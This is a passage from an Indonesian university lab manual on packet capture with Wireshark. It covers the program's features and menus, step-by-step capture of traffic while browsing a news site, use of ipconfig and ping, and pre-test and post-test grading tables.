• Developer, untuk debug implementasi protocol • Awam memakainya untuk belajar protocol jaringan Fitur-fitur wireshark :

• Tersedia untuk Windows dan Unix • Capturing paket data secara live dari suatu jaringan • Menampilkan informasi paket secara sangat detail • Membuka dan menyimpan paket data yang sudah di-capture • Import dan export paket data dari program capturing lain • Paket filter dalam berbagai kriteria • Mencari paket data dalam berbagai kriteria • Mebuat statistic data. Menu pada Wireshark :

• File : Open, merge, save, print, export, capture, quit • Edit : mencari paket, refrensi waktu, menandai paket, konfigurasi profil, set preferences • View : menagani tampilan data dicapture termasuk pewarnaan, zooming, dll • Go : untuk menuju ke paket tertentu • Capture : memulai dan stop capturing, mengedit filter • Analize  : memanipulasi filter, enable atau disable protocol yang diinginkan, dll • Statistics : menampilkan berbagai statistic, termasuk garis besar paket yang ditampilkan.

11.4. HARDWARE DAN SOFTWARE Hardware dan software yang digunakan dalam praktikum ini yaitu:

1. Komputer. 2. Sistem operasi Linux/Windows 3. Wireshark 11.5. PRE-TEST Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 06P01 | CPMK 5.1.4 | Apa itu Wireshark? | 30 |
| 2. | CPL 06P01 | CPMK 5.1.4 | Jelaskan kegunaan Wireshark! | 70 |

### 11.6. LANGKAH PRAKTIKUM

### Aturan Penilaian (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Dokumen Pendukung | Skor |
| --- | --- | --- | --- | --- | --- |

---

<!-- Halaman 100 -->

| 1. | CPL 06P01 | CPMK 5.1.4 | Selesaikan langkah praktikum a – i | Hasil praktikum langkah a – i | 100 |
| --- | --- | --- | --- | --- | --- |

### Langkah-Langkah Praktikum:

a. Pastikan Wireshark telah terinstall b. Jalankan wireshark, akan muncul tampilan awal dari wireshark

Gambar 11. 1 Halaman interface saat membuka wireshark

### c. Untuk memulai menangkap paket-paket data, pilih menu Capture lalu pilih Interface

### Gambar 11. 2 interface capture

### Maka akan muncul tampilan untuk memilih interface yang akan kita Analisa

---

<!-- Halaman 101 -->

Gambar 11. 3 Pilihan yang akan ditangkap d. Pilih lokasi yang akan kita capture, misal kita pilih Ethernet, maka centang pada bagian yang kita pilih lalu klik Start untuk memulai pengcapturean data. Wireshark akan segera mengcapture paket-paket data yang melintas pada jaringan computer, berikut tampilan utama saat wireshark bekerja :

Gambar 11. 4 Halmaan utama saat capturing berlangsung

### Gambar 11. 5 Menu dalam tampilan capturing

---

<!-- Halaman 102 -->

### Gambar 11. 6 Display filter

### Untuk memunculukan filter bisa juga menggunakan CTRL+F untuk memfilter

### Gambar 11. 7 Daftar paket yang berhasil ditangkap

Gambar 11. 8 detail dari paket yang terpilih

Gambar 11. 9 detail paket dalam format heksadesimal

Pada bagian gambar 11.7 daftar paket, terdapat kolom-kolom sebagai berikut:

- Time : menampilkan waktu saat paket tersebut tertangkap - Source : menampilkan IP sumber dari paket data - Destination : menampilkan IP tujuan dari paket data - Protocol : Menampilkan protocol yang dipakai oleh paket data - Info : menampilkan informasi detail dari paket data

---

<!-- Halaman 103 -->

### e. Buka web browse dan bukalah sembarang website atau situs misal www.kompas.com

Gambar 11. 10 hasil tangkapan Ketika mengakses Kompas.com

Gambar 11. 11 Detail dari web Kompas.com

Gambar 11. 12 detail dari web Kompas dalam format heksadesimal

---

<!-- Halaman 104 -->

### f. Setelah masuk browser hentikan proses pada wireshark dengan klik Stop pada menu capture,

dari gambar langkah e terlihat paket-paket data yang tertangkap termasuk www.kompas.com g. Analisis paket data www.kompas.com , sebagai berikut: h. Untuk memastikan IP kita dan IP URL yang kita analisis gunakan command prompt,akan muncul jendela console command prompt, ketik ipconfig, akan keluar hasil seperti dibawah ini i. Sedangkan untuk mengetahui IP URL dengan mengetikkan ping URL Ketik → c:\> ping www.kompas.com

### 11.7. POST TEST

### Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 06P01 | CPMK 5.1.4 | Silahkan gunakan Wireshark untuk menganalisis 2 situs lain. | 100 |

### 11.8. HASIL CAPAIAN PRAKTIKUM

Diisi oleh asisten setelah semua assessment dinilai.

| No | Bentuk Assessment | CPL | CPMK | Bobot | Skor (0-100) | Nilai Akhir (Bobot x Skor) |
| --- | --- | --- | --- | --- | --- | --- |
| 1. | Pre-Test | CPL 06-P01 | CPMK 5.1.4 | 20% | 100 | 20 |
| 2. | Praktik | CPL 06-P01 | CPMK 5.1.4 | 30% | 100 | 30 |
| 3. | Post-Test | CPL 06-P01 | CPMK 5.1.4 | 50% | 100 | 50 |
| Total Nilai |  |  |  |  |  | 100 |

---

<!-- Halaman 105 -->

### LEMBAR JAWABAN PRE-TEST DAN POST-TEST PRAKTIKUM

| Nama : NIM : | Asisten: Paraf Asisten: | Tanggal: Nilai: |
| --- | --- | --- |

---

<!-- Halaman 107 -->

### DAFTAR PUSTAKA 
 
 
1. https://help.ubuntu.com/community/IptablesHowTo 
2. https://help.ubuntu.com/8.04/serverguide/C/firewall.html